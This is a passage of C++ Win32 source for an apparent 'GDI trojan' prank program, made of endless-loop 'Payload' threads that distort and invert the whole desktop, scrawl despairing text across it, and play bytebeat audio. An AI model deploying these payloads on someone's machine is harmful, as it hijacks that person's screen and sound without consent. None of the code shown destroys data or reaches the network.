		PlgBlt(hdc, pt1, hdc, rect.left, rect.top, rect.right, rect.bottom, 0, 0, 0);
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload8_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				float fx = round(i * (log(x + (y * (i / 16))) * sqrt(x % (1 + y))) + asin(sinf(x / 72.7f)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 5000.f + y / h * .2f, 1.f);
				if (hslcolor.s < 1.f) { hslcolor.s += .1f; }
				if (hslcolor.l < 1.5033f) { hslcolor.l += 0.114514f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload8_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdc, bmp);
	LPCSTR texts[11] = {
		"Blade Archer.exe",
		"Seed.1217",
		"LambdaTechnology Studio",
		"LanPiaoPiaoFlyNB",
		"structures are broken",
		"Waterblade Archer is unreachable.",
		"UltimateCattail won't belong to me",
		"hopelessness",
		"Nobody wants to help me.",
		"Why NO freedom?",
		"my internal organs pain toooooooooooo much!"
	};
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int rnd = rand() % 11;
		HFONT hFont = CreateFontA(rand() % 150, 0, rand() % 5033, 0, FW_EXTRABOLD, true, true, true, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Frekoda");
		SelectObject(hdc, hFont);
		SetBkMode(hdc, 0);
		SetTextColor(hdc, RndRGB);
		TextOutA(hdc, rand() % w, rand() % h, texts[rnd], strlen(texts[rnd]));
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hFont);
		Sleep(25);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload9_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), i = 0, h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* pBits = NULL;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; ++y) {
			for (int x = 0; x < w; ++x) {
				int index = x ^ y * w;
				BYTE originalRed = pBits[index].rgbRed;
				BYTE originalGreen = pBits[index].rgbGreen;
				BYTE originalBlue = pBits[index].rgbBlue;
				BYTE fractalRed = (((x * y) % 3 == 0) ? ((x | y) + (i * 8)) : ((x & y) - (i * 8))) / 3;
				BYTE fractalGreen = ((3 * (y ^ x)) % 2 != 0) ? ((x >> ~y) * (i * 8)) : ((~x << y) * (i * 8)) % 24;
				BYTE fractalBlue = (x >> ~y | y ^ x);
				pBits[index].rgbRed = static_cast<BYTE>(2 * fractalRed);
				pBits[index].rgbGreen = static_cast<BYTE>(1 * fractalGreen + 1 * originalGreen);
				pBits[index].rgbBlue = static_cast<BYTE>(1.5 * fractalBlue + 0.5 * originalBlue);
				pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 0.5);
				pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen * 0.5));
				pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.5);
				pBits[index].rgbRed = static_cast<BYTE>(0.5 * fractalBlue + 0.5 * fractalGreen);
				pBits[index].rgbGreen = static_cast<BYTE>(0.5 * fractalRed + 0.5 * fractalBlue);
				pBits[index].rgbBlue = static_cast<BYTE>(0.5 * fractalGreen + 0.5 * fractalRed);
			}
		}
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		i++;
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload10_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), move = 10, go = 0, t = 0;
	srand(time(NULL));
	while (true) {
		hdc = GetDC(0);
		for (int y = 0; y < h; y++) {
			int MazeLarperNoSkidNoAI = rand() % 50;
			if (MazeLarperNoSkidNoAI > 25) { go = 1; }
			else { go = 0; }
			if (go == 1) { StretchBlt(hdc, -move, y, w, 1, hdc, 0, y, w, 1, SRCCOPY); }
			else { StretchBlt(hdc, move, y, w, 1, hdc, 0, y, w, 1, SRCCOPY); }
		}
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hbrush);
		PatBlt(hdc, 0, (t % 40) * (h / 40), w, h / 40, PATINVERT);
		PatBlt(hdc, (t % 40) * (w / 40), 0, w / 40, h, PATINVERT);
		t++;
		if (t > w) { t = 0; }
		ReleaseDC(NULL, hdc);
		DeleteObject(hbrush);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI Payload10_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), count = 0;
	double size = w * 1.5f;
	srand(time(NULL));
	while (true)
	{
		int x = w / 2, y = h / 2, i = 0;
		for (i = 0; i < size; i += 2)
		{
			BigPolygonFunction(x - i / 50, y - i / 50, i, i);
			if (count == 10) {
				count = 0;
				Sleep(1);
			}
			else { count++; }
		}
	}
	return 0;
}
DWORD WINAPI Payload11_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = round((asin(cosf(x / 25.f)) * acos(sinf(y / 10.f))) * i);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 1000.f + y / h * .2f, .7f);
				hslcolor.s = fmod(fx / 120.f + y / h * .1f, 1.5f);
				hslcolor.s += 1.05033f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload11_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xf = 0, yf = 0, signX = 15, signY = 5, signX1 = 1, signY1 = 1, incrementor = 10, radius = 100.0f, origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2), x, y, centerX, centerY;
	double angle = 0;
	while (true)
	{
		HDC hdc = GetDC(0);
		xf += signX;
		yf += signY;
		centerX = origX - (w / 4), centerY = origY - (h / 4);
		x = (tan(angle) * radius) + centerX, y = (sin(angle) * radius) + centerY;
		int icon_x = GetSystemMetrics(SM_CXICON), icon_y = GetSystemMetrics(SM_CYICON);
		for (INT i = 64; i > 8; i -= 8) { DrawIconEx(hdc, (50 + x - i + xf) - icon_x, (50 + y - i + yf) - icon_y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(107)), 5 * icon_x, 5 * icon_y, 0, NULL, DI_NORMAL); }
		angle = fmod(angle + PI / radius, PI * radius);
		if (yf == 0) signY = 5;
		if (xf == 0) signX = 15;
		if (yf >= GetSystemMetrics(1)) signY -= 5;
		if (xf >= GetSystemMetrics(0)) signX -= 15;
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload12_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xSize = h / 10, ySize = 9;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < h * 2; i++) {
			int wave = tanl(i / ((float)xSize) * PI) * (ySize);
			HBRUSH hbrush = CreateSolidBrush(RndRGB);
			SelectObject(hdcCopy, hbrush);
			BitBlt(hdcCopy, i, 0, 1, h, hdcCopy, i, wave, SRCBRUSH);
			DeleteObject(hbrush);
		}
		for (int i = 0; i < w * 2; i++) {
			int wave = sinh(i / ((float)xSize) * PI) * (ySize);
			HBRUSH hbrush = CreateSolidBrush(RndRGB);
			SelectObject(hdcCopy, hbrush);
			BitBlt(hdcCopy, 0, i, w, 1, hdcCopy, wave, i, SRCBRUSH);
			DeleteObject(hbrush);
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(25);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload12_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), count = 1, h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, 0, 0, w + count, h - count, hdc, 0, 0, w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w - count, h + count, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(10);
		count++;
		if (count > 25) { count = 1; }
	}
	return 0;
}
DWORD WINAPI Payload13_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int x = 0; x <= w; x += 10) {
			for (int y = 0; y <= h; y += 10) {
				StretchBlt(hdcCopy, x, y, rand() % 10, rand() % 10, hdcCopy, x, y, 1, 1, NOTSRCERASE);
				StretchBlt(hdcCopy, x, y, rand() % 10, rand() % 10, hdcCopy, x, y, 1, 1, SRCINVERT);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0x00;
}
DWORD WINAPI Payload13_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdc, 0, 0, w + rand() % 50, h, hdc, 0, 0, w + rand() % 50, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h + rand() % 50, hdc, 0, 0, w, h + rand() % 50, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload13_num3(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RECT rect;
	while (true)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		POINT ps[3];
		ps[0].x = 0, ps[0].y = -(h / 8);
		ps[1].x = (w + (w / 8)), ps[1].y = 0;
		ps[2].x = -(w / 8), ps[2].y = h;
		PlgBlt(hdc, ps, hdc, rect.left, rect.top, rect.right, rect.bottom, 0, 0, 0);
		Sleep(1);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload14_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = i * (cot((x + (i * 20)) / 100.f) + acos(sinf((y + (i * 20)) / 100.f))) * 10;
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h += fmod(fx / 4000.f + y / w * .2f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		i++;
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload15_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), n = 0, n1 = -1, n2 = -1;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		if (n == 0) {
			int tmp = n1;
			for (int x = 0; x <= w; x += (w / 5)) {
				BitBlt(hdcCopy, x, tmp * 20, w / 5, h, hdcCopy, x, 0, SRCCOPY);
				HBRUSH hbrush = CreateSolidBrush(RndRGB);
				HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
				PatBlt(hdcCopy, x, 0, w / 5, h, PATINVERT);
				SelectObject(hdcCopy, hbrushCopy);
				DeleteObject(hbrush);
				tmp = -tmp;
			}
			n1 = -n1, n = 1;
		}
		else {
			int tmp = n2;
			for (int y = 0; y <= h; y += (h / 5)) {
				BitBlt(hdcCopy, tmp * 20, y, w, h / 5, hdcCopy, 0, y, SRCCOPY);
				HBRUSH hbrush = CreateSolidBrush(RndRGB);
				HGDIOBJ hbrushCopy = SelectObject(hdcCopy, hbrush);
				PatBlt(hdcCopy, 0, y, w, h / 5, PATINVERT);
				SelectObject(hdcCopy, hbrushCopy);
				DeleteObject(hbrush);
				tmp = -tmp;
			}
			n2 = -n2, n = 0;
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(50);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload15_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), count = 0;
	while (true)
	{
		hdc = GetDC(0);
		int aaa = rand() % w, bbb = rand() % h;
		BitBlt(hdc, aaa, bbb, 200, 200, hdc, aaa + rand() % 21 - 10, bbb + rand() % 21 - 10, SRCINVERT);
		ReleaseDC(NULL, hdc);
		if (count == 30) {
			count = 0;
			Sleep(1);
		}
		else { count++; }
		Sleep(44.444444444f);
	}
	return 0;
}
DWORD WINAPI Payload16_num1(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), ii = 0;
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (cbrt((x * y) ^ (y * y)) * tan(w - x + y) * ii) / 16.f;
		}
		ii++;
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload16_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		hdc = GetDC(0);
		int rw = rand() % w, rh = rand() % h, rs = rand() % 222, rr = 1 + rand() % 11;
		DWORD rop = NULL;
		if (rr == 1) { rop = SRCCOPY; }
		else if (rr == 2) { rop = NOTSRCCOPY; }
		else if (rr == 3) { rop = SRCERASE; }
		else if (rr == 4) { rop = NOTSRCERASE; }
		else if (rr == 5) { rop = SRCINVERT; }
		else if (rr == 6) { rop = SRCAND; }
		else if (rr == 7) { rop = SRCPAINT; }
		else if (rr == 8) { rop = PATINVERT; }
		else if (rr == 9) { rop = PATCOPY; }
		else if (rr == 10) { rop = RGBBRUSH; }
		else if (rr == 11) { rop = SRCBRUSH; }
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
		BitBlt(hdc, rw, 0, rs, h, hdc, rw, 0, rop);
		BitBlt(hdc, 0, rh, w, rs, hdc, 0, rh, rop);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(32.48f);
	}
	return 0;
}
DWORD WINAPI Payload17_num1(LPVOID lpParam)//credits to camellia-y7x, but i modified its rgb color
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
	PRGBQUAD rgbScreen = { 0 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	BLENDFUNCTION blur = { AC_SRC_OVER, 0, 100, 0 };
	while (true)
	{
		hdc = GetDC(0);
		for (int i = 0; i < w * h; i++) {
			int luckynum = rand() % 40;
			if (luckynum <= 10) { rgbScreen[i].rgb = 19491001; }
			else if (luckynum > 10 && luckynum <= 20) { rgbScreen[i].rgb = 70237230; }
			else if (luckynum > 20 && luckynum <= 30) { rgbScreen[i].rgb = 20130410; }
			else { rgbScreen[i].rgb = 58442642; }
		}
		for (int x = 0; x < w; x += 50) { for (int y = 0; y < h; y += 50) { StretchBlt(hdcCopy, x, y, 50, 50, hdcCopy, x, y, 3, 3, NOTSRCCOPY); } }
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
VOID WINAPI bytebeat1() {//credits to pankoza
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((sin(t + t >> 5) * tan(t + t >> 7)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t & 11 * t | t) + cos(t >> 5 * t << 1) * sqrt(t >> 4)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {//modified from skidded caesium.exe
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * tan(42 & t >> 10)) + (256 * sin(1 - t % 2048))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 18000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t & ((t >> 8) | (t + 7) ^ (t >> 5))) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {//old bytebeat from skidded caesium.exe
	int nSamplesPerSec = 32000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t & t >> 6 & t * (t >> ((t & 65535) >> 12))) + (3 * t / 4 & t >> 12 & 127) + (t * ((t - 2048) >> 7 & (t - 2048) >> 8 & (t - 2048) >> 9 & 16) >> t / 64)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
